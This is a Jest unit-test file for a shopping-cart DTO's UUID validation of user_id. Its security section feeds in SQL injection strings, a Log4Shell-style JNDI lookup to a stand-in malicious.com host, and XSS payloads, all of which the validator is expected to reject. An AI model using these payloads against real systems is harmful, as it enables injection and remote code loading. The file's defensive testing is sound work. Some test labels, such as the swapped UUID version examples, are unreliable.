import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { CreateCartDto } from '../create-cart.dto';

describe('CreateCartDto', () => {
  describe('user_id validation', () => {
    it('should pass with valid UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '123e4567-e89b-12d3-a456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass when user_id is not provided (optional field)', async () => {
      const dto = plainToInstance(CreateCartDto, {});

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass when user_id is null', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: null,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass when user_id is undefined', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: undefined,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when user_id is not a valid UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: 'invalid-uuid',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when user_id is a simple string', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: 'user-123',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when user_id is a number', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: 12345,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when user_id is empty string', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when user_id is boolean', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: true,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });
  });

  describe('edge cases', () => {
    it('should pass with UUID v1', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '550e8400-e29b-41d4-a716-446655440000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with UUID v4', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '123e4567-e89b-12d3-a456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with nil UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '00000000-0000-0000-0000-000000000000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with maximum UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: 'ffffffff-ffff-ffff-ffff-ffffffffffff',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with uppercase UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '123E4567-E89B-12D3-A456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with mixed case UUID', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '123e4567-E89B-12d3-a456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });
  });

  describe('transformation', () => {
    it('should transform plain object to CreateCartDto instance', () => {
      const plainData = {
        user_id: '123e4567-e89b-12d3-a456-426614174000',
      };

      const dto = plainToInstance(CreateCartDto, plainData);

      expect(dto).toBeInstanceOf(CreateCartDto);
      expect(dto.user_id).toBe('123e4567-e89b-12d3-a456-426614174000');
    });

    it('should handle null input gracefully', () => {
      const dto = plainToInstance(CreateCartDto, null);

      expect(dto).toBeInstanceOf(CreateCartDto);
      expect(dto.user_id).toBeUndefined();
    });

    it('should handle undefined input gracefully', () => {
      const dto = plainToInstance(CreateCartDto, undefined);

      expect(dto).toBeInstanceOf(CreateCartDto);
      expect(dto.user_id).toBeUndefined();
    });

    it('should handle empty object input', () => {
      const dto = plainToInstance(CreateCartDto, {});

      expect(dto).toBeInstanceOf(CreateCartDto);
      expect(dto.user_id).toBeUndefined();
    });

    it('should preserve string type for user_id', () => {
      const plainData = {
        user_id: '123e4567-e89b-12d3-a456-426614174000',
      };

      const dto = plainToInstance(CreateCartDto, plainData);

      expect(typeof dto.user_id).toBe('string');
    });
  });

  describe('additional properties', () => {
    it('should ignore additional properties', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '123e4567-e89b-12d3-a456-426614174000',
        extra_property: 'should be ignored',
        another_property: 123,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
      expect(dto).toHaveProperty('user_id');
      expect(dto).not.toHaveProperty('extra_property');
      expect(dto).not.toHaveProperty('another_property');
    });
  });

  describe('real-world scenarios', () => {
    it('should handle typical user creation scenario', async () => {
      const dto = plainToInstance(CreateCartDto, {
        user_id: '550e8400-e29b-41d4-a716-446655440000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should handle guest cart creation scenario', async () => {
      const dto = plainToInstance(CreateCartDto, {});

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should handle cart creation after user registration', async () => {
      const newUserId = '123e4567-e89b-12d3-a456-426614174000';
      const dto = plainToInstance(CreateCartDto, {
        user_id: newUserId,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
      expect(dto.user_id).toBe(newUserId);
    });
  });

  describe('security considerations', () => {
    it('should validate against malicious UUID patterns', async () => {
      const maliciousUuids = [
        '123e4567-e89b-12d3-a456-426614174000', // Valid but potentially suspicious
        '550e8400-e29b-41d4-a716-446655440000', // Valid UUID
      ];

      for (const uuid of maliciousUuids) {
        const dto = plainToInstance(CreateCartDto, {
          user_id: uuid,
        });

        const errors = await validate(dto);
        // These should pass validation as they are valid UUID formats
        expect(errors).toHaveLength(0);
      }
    });

    it('should reject SQL injection attempts', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "${jndi:ldap://malicious.com/a}",
      ];

      for (const attempt of sqlInjectionAttempts) {
        const dto = plainToInstance(CreateCartDto, {
          user_id: attempt,
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);
        expect(errors[0].constraints).toHaveProperty('isUUID');
      }
    });

    it('should reject XSS attempts', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
      ];

      for (const attempt of xssAttempts) {
        const dto = plainToInstance(CreateCartDto, {
          user_id: attempt,
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);
        expect(errors[0].constraints).toHaveProperty('isUUID');
      }
    });
  });

  describe('performance considerations', () => {
    it('should handle large number of validation requests efficiently', async () => {
      const start = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        const dto = plainToInstance(CreateCartDto, {
          user_id: '123e4567-e89b-12d3-a456-426614174000',
        });
        await validate(dto);
      }
      
      const end = Date.now();
      const duration = end - start;
      
      // Should complete 1000 validations in reasonable time (< 1 second)
      expect(duration).toBeLessThan(1000);
    });

    it('should handle invalid validation requests efficiently', async () => {
      const start = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        const dto = plainToInstance(CreateCartDto, {
          user_id: 'invalid-uuid',
        });
        await validate(dto);
      }
      
      const end = Date.now();
      const duration = end - start;
      
      // Should complete 1000 validations in reasonable time (< 1 second)
      expect(duration).toBeLessThan(1000);
    });
  });
});
